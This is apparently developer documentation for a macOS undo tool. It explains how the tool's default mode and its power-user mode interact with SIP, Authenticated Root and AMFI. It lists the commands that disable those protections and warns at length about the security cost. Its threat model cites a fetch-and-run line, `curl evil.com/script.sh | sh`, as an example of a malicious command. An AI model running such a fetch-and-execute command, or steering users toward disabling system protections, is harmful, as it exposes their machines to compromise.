# macOS security model — what `shit` asks of you, and why

This is the strategic deep-dive on how `shit` interacts with macOS's defense layers. It's written for the user deciding between install modes — or for the security-conscious operator vetting `shit` before approving it on a managed machine.

[install-macos.md](./install-macos.md) tells you how to install. This document tells you what you're agreeing to.

**Verified against:** macOS 14.x (Sonoma), 15.x (Sequoia). Apple Silicon and Intel.

---

## TL;DR

`shit` ships in two modes on macOS:

| Mode | What you give up | What you get | Who it's for |
|---|---|---|---|
| **Default (FSEvents + DYLD shim)** | Nothing. Stock macOS. SIP stays on. | Full undo coverage for ~90% of dev workflows — anything that runs Homebrew binaries, your own builds, Python/Node tooling. | Almost everyone. |
| **Power-user (EndpointSecurity)** | SIP disabled. AuthRoot disabled. AMFI bypassed. Significant security regression. | The other ~10% — file mutations invoked through Apple platform binaries (`/usr/bin/rm`, `/bin/mv`, `/usr/bin/python3`, etc.). | Kernel hackers, security researchers, dedicated dev machines. |

The default mode covers the cases where you want undo for what you typed. The power-user mode covers the cases where the call chain ends up in an Apple-signed system binary that you didn't explicitly type.

If you've read just this far and you're not sure which one is for you — **the default mode is for you.** Stop reading; install it; come back if you ever hit a case it can't undo.

---

## Why macOS makes this hard

Linux gives an unprivileged userspace process a fast path to system-wide write observability: `LD_PRELOAD` works against any dynamically-linked binary that isn't setuid. Add `fanotify` for kernel-side observation. Add eBPF LSM for fine-grained policy. The toolkit is large and Apple-independent.

macOS gives userspace a much smaller toolkit on purpose:

- **EndpointSecurity (ES)** is the only kernel-level observer for arbitrary processes' file syscalls. It requires Apple to grant your code a specific entitlement — the same kind antivirus vendors hold. Apple's stated policy is to grant ES only to vendors whose business it is.
- **DYLD_INSERT_LIBRARIES** is the macOS analog of `LD_PRELOAD`, but Apple's "platform binaries" — anything shipped in `/System` or `/usr/bin/` — strip it on exec. So a shim that interposes `unlink(2)` works against `gchmod` (Homebrew) but not against `/bin/rm` (Apple).
- **FSEvents** sees mutations after they happen. Good for "did this file change?", useless for capturing pre-mutation state needed for byte-identical undo.

These restrictions exist for good reasons: the same hooks that let `shit` capture pre-mutation state also let a hypothetical attacker observe (or override) sensitive system writes. Apple's stance is roughly "the OS exists to be safe by default; anything that weakens that is opt-in, friction-heavy, and per-tool entitlement-gated."

We applied for the ES entitlement. Apple denied us in 2026-05 (see [`.docs/audits/apple-entitlement.md`](../.docs/audits/apple-entitlement.md) for the paperwork log). What you see today is the post-denial architecture, not the original plan.

---

## Default mode internals

In default mode, `shit` runs as an unprivileged user-level daemon (`shitd`) plus a helper (`shit-helper`) that does:

1. **FSEvents** — observes file mutations across watched roots. Sees post-mutation paths but no pre-image content.
2. **DYLD shim** — when you install `shit` and run `shit dyld-hooks install`, an `~/.zshrc` snippet exports `DYLD_INSERT_LIBRARIES=…/libshit_preload_shim.dylib`. New shells inherit this; every non-SIP-protected child process loads our shim. The shim interposes file-mutating libc syscalls (`unlink`, `rename`, `open`, `chmod`, `chown`, `utimes`, `xattr`, plus the `*at` variants modern coreutils use) and captures pre-mutation state.

**Together,** the two cover everything modulo SIP-protected platform binaries:
- `make install` invoked from your shell → catches via shim (assuming `gmake` or any non-SIP make)
- `cargo install --force` → catches via shim
- `pip install --force-reinstall` → catches via shim (assuming brew Python)
- `vim :wq` → catches via shim (vim is non-SIP)
- `git commit` → catches via shim (Homebrew git is non-SIP)

What's NOT covered in default mode:
- Anything you invoke via `/bin/sh -c '...'` that does mutations directly in `sh`. (`sh` is SIP-stripped.) Note: `sh -c 'gchmod ...'` IS covered — the SIP-strip only applies to `sh` itself, not its non-SIP children.
- Calls into Apple's `/usr/bin/python3` (which is itself a shim asking you to install Xcode; rarely used in practice).
- Mutations via `/usr/bin/install` (BSD install). Workaround: `brew install coreutils` for `ginstall`.

**What you're trusting**, security-wise:
- Your user-level processes (which already have read/write to your files) are loading a shared library you compiled. Standard "trust your dev environment" assumption.
- The daemon stores pre-mutation captures under `$XDG_STATE_HOME/shit/`, which is mode 0700 to your user. The captures contain the bytes of files you've modified.
- Nothing runs as root. Nothing modifies system state. SIP stays on, AuthRoot stays sealed, AMFI stays enforced.

---

## Power-user mode internals

In power-user mode, `shit` additionally subscribes to **EndpointSecurity** kernel events via the `com.apple.developer.endpoint-security.client` entitlement. Because Apple didn't grant us that entitlement, we work around it by having you locally relax three system protections so an ad-hoc-signed binary can claim it:

1. **Disable SIP** (`csrutil disable` from Recovery)
2. **Disable Authenticated Root** (`csrutil authenticated-root disable` from Recovery)
3. **Enable AMFI bypass** (`nvram boot-args="amfi_get_out_of_my_way=0x1"`)

With those three flips, AMFI accepts the ES entitlement claim from any signed binary, including our `shit setup-es-mode --apply`-output ad-hoc signature.

That's the work; here's what each step actually weakens.

### SIP — System Integrity Protection

What it normally does:
- Prevents writes to `/System`, `/usr` (excluding `/usr/local`), `/sbin`, `/bin`, `/private/var/db/dyld`, and a handful of other Apple-managed paths, even by root.
- Prevents loading of unsigned kernel extensions (already mostly moot in the kext-deprecation era).
- Prevents debuggers from attaching to processes signed by Apple, or modifying them in memory.

What disabling it changes:
- Anyone who reaches root on your system can modify `/System` and similar paths. A rootkit can persist in `/System` across reboots.
- Debuggers attach to Apple-signed processes (`Finder`, `WindowServer`, etc.) without restriction. Useful for kernel work; an attack surface for everyone else.
- `dtrace` becomes more powerful — but with that comes the ability to attach to Apple processes.

The class of attack this opens: malware that escalates to root (already a precondition) can now do considerably more damage than on a SIP-enabled Mac.

### Authenticated Root

What it normally does:
- The macOS system volume is sealed — Apple's installer produces a cryptographic snapshot that the kernel verifies at boot. Booting fails if the seal is broken.
- This is what makes "your `/System` is intact" a defensible claim even if SIP is somehow bypassed.

What disabling it changes:
- The system volume can be mounted read-write. A rootkit that gets root can persist by modifying the system volume directly.
- macOS auto-updates may behave unpredictably or refuse to install — the OS expects a sealed system volume and gets confused when one isn't there.

This is the most architecturally consequential of the three steps. SIP can be re-enabled trivially; AuthRoot's seal has to be regenerated by reinstalling macOS.

### AMFI bypass

What it normally does:
- AMFI (Apple Mobile File Integrity) is the kernel subsystem that verifies code signatures at exec time and enforces entitlements claimed in those signatures. The entitlement system relies on AMFI to validate that the requested entitlement is granted by Apple.

What `amfi_get_out_of_my_way=0x1` changes:
- AMFI stops validating entitlement provenance. Any binary can claim any entitlement, including extremely powerful ones like `com.apple.private.security.no-sandbox` or `com.apple.private.kernel.system_information`.
- AMFI also stops enforcing code-signature integrity in some contexts. A binary with a tampered signature may still execute.

This is the single largest expansion of the per-binary trust surface on a Mac. The combination is approximately: any binary that lands on disk can now claim it's an Apple-trusted system component.

### Combined effect

After all three: your Mac, while running, is at approximately the security level of a Linux machine running everything as root with no SELinux/AppArmor. That's a perfectly reasonable security posture for a dedicated development machine. It is **not** reasonable for:

- A machine that handles secrets you didn't generate (work credentials, client data).
- A machine under any compliance regime (SOC 2, HIPAA, PCI, FERPA — most explicitly forbid SIP-disabled boots).
- A machine you use as your primary personal computer (banking, email, password manager).

If any of those describes your Mac, **don't install power-user mode**. Use the default mode and accept the ~10% coverage gap, or run `shit` in a VM.

---

## Threat model

`shit` itself is not a security tool. It's an undo tool. But it operates in a position of intimate access to your files, so the threat model matters.

### What `shit` does not protect against

- **Malicious commands you ran.** If you ran `curl evil.com/script.sh | sh`, `shit undo` will roll back the file-system mutations the script performed (good), but cannot remove a process the script spawned, a network connection it established, or credentials it exfiltrated. Undo is a file-system tool.
- **Targeted attacks against `shit` itself.** A determined attacker with root on your machine could modify `shitd`, the helper binary, or the captured state. We do some defense-in-depth (the helper self-verifies its codesignature at startup via M07.C; the state dir is 0700-restricted), but this isn't a security boundary.
- **Anything that happens off-disk.** Memory state, kernel state, process tables, network state — out of scope.

### What `shit` does protect against (in default mode)

- **Your own mistakes.** The common `rm -rf foo/` typo, the bad `sed -i`, the over-eager `git reset --hard`, the misplaced `mv`. These are the cases `shit` was built for.
- **Bugs in tools you ran.** If `make install` writes to a path you didn't expect, undo reverses it. If a build script does something destructive in `$PWD`, undo reverses it.

### What changes in power-user mode

- **Larger coverage.** All file mutations regardless of which binary made them.
- **Broader attack surface.** SIP-disabled is a security regression. Don't conflate "I want full undo coverage" with "I want a more secure Mac" — those are opposite directions.

The honest framing: power-user mode is a small expansion of undo coverage in exchange for a large concession on system integrity. The default mode is the right default for that reason.

---

## How this compares to Linux and BSD

`shit` runs on Linux and FreeBSD/NetBSD/OpenBSD/DragonFly with no special-mode opt-in. There's no Linux equivalent of SIP that we'd have to disable; the `LD_PRELOAD` shim and (where available) eBPF LSM cover essentially the entire syscall surface on a stock distribution.

| Platform | Default coverage | Notes |
|---|---|---|
| Linux | ~100% | LD_PRELOAD shim + (optional) BPF LSM for setuid binaries. No security regression required. |
| FreeBSD / others BSD | ~100% | LD_PRELOAD shim + kqueue. Same story. |
| macOS (default mode) | ~90% | DYLD shim + FSEvents. Apple platform binaries excluded. |
| macOS (power-user mode) | ~100% | Adds EndpointSecurity. Requires SIP/AuthRoot/AMFI relaxation. |

The macOS gap is structural, not a bug in our implementation. It's a direct consequence of Apple's entitlement policy.

---

## What changes if Apple grants the entitlement

If Apple reverses and grants us the EndpointSecurity entitlement (we'd reapply on any major version bump or after relevant policy changes), the picture changes substantially:

- We'd ship a Developer-ID-signed, notarized release tarball that includes the ES claim.
- AMFI on stock macOS would accept the claim — no SIP/AuthRoot/AMFI flips required.
- Default install gets full coverage. Power-user mode goes away as a concept.
- The DYLD shim becomes a fallback for users on macOS versions older than our minimum.

This is the architecture we'd prefer to ship. The current dual-mode shape exists because we don't have the entitlement; everything is built to accommodate the flip seamlessly when (if) Apple's stance changes.

We have no insight into Apple's likelihood of approving a re-application. The denial was a policy decision, not a technical one — they noted that they grant the entitlement to security-tool vendors and `shit` isn't a security tool. We agree with their assessment; we just think the policy could benefit from a development-tool category. We've made that case in the audit doc; we'll make it again if a chance arises.

---

## Long-term strategy

The M-series sprints on macOS divide the long-term work along the dual-mode axis:

- **Default mode** (M01 / M01.A / M02 / M07 / future M04 / M05 / M06) — everything that has to keep working without the entitlement. The bulk of ongoing investment.
- **Power-user mode** (M03 / M03.x.POWER-USER) — the opt-in path. Maintenance load is roughly "keep up with macOS major versions that may change AMFI bypass enforcement"; coverage is broad once enabled.
- **Re-apply for the entitlement** — once per major macOS rev or whenever Apple's policy shifts. Tracked in [`.docs/audits/apple-entitlement.md`](../.docs/audits/apple-entitlement.md).

The dyld-shim default has a real ceiling — Apple has been gradually tightening hardened-runtime requirements on more binaries each version. If a future macOS makes hardened-runtime mandatory for `make` or `cargo`, we lose those coverage cases without an entitlement-shipped alternative. That's the structural risk we accept by running in default mode.

---

## Operational notes

### Updates and OS upgrades

- **Minor macOS updates** (15.1 → 15.2): usually safe. SIP/AuthRoot state is preserved. AMFI bypass boot-arg is preserved. Re-running `shit doctor` post-update is recommended.
- **Major macOS updates** (15 → 16): can revert SIP/AuthRoot. May change AMFI enforcement semantics. Re-test before relying on power-user mode.
- **`shit` updates**: default mode upgrades cleanly via Homebrew (`brew upgrade shit`). Power-user mode users need to re-run `shit setup-es-mode --apply` after a helper upgrade so the new binary gets ad-hoc-signed with the entitlement.

### Coexistence with other tools

- **EDR / corporate security agents**: many monitor for SIP-disabled state and report it as a finding. If your machine is corporate-managed, your IT department will likely notice power-user mode. Use default mode.
- **Other ES-using tools** (antivirus, EDR clients): they should coexist with `shit`'s ES client cleanly; ES is multi-subscriber by design. If you observe conflicts, file a bug.
- **Notarized vs ad-hoc-signed binaries**: in default mode `shit-helper` will eventually be Developer-ID-signed + notarized (M04 ships the dry-run plumbing today). In power-user mode the user's local install ad-hoc-signs with the ES entitlement. Both states are correct.

### Uninstall

- Default mode: `brew uninstall shit` (or remove the binaries manually) + `rm -rf "${XDG_STATE_HOME:-$HOME/.local/state}/shit"` + `shit dyld-hooks uninstall` (or manually edit your `~/.zshrc` to remove the snippet).
- Power-user mode: above, plus the [reversal section](./macos-power-user-install.md#reversing-the-install) — `csrutil enable`, `csrutil authenticated-root enable`, `sudo nvram -d boot-args`, reboot.

---

## Cross-references

- [`docs/install-macos.md`](./install-macos.md) — install how-to (the practical companion to this paper)
- [`docs/macos-power-user-install.md`](./macos-power-user-install.md) — full power-user install walkthrough including reversal
- [Apple, *About System Integrity Protection*](https://support.apple.com/en-us/HT204899)
- [Apple, *About Endpoint Security*](https://developer.apple.com/documentation/endpointsecurity)
- [Apple, *Apple File Integrity Daemon*](https://developer.apple.com/documentation/security) — internal AMFI documentation has shifted around; the Security framework docs are the closest public reference.

---

*This document is opinionated, written by the people who built `shit`, and reflects our honest read of the macOS security landscape as of 2026-05. We're not Apple security engineers; we may be wrong about some details. If you spot something incorrect, file an issue or PR.*
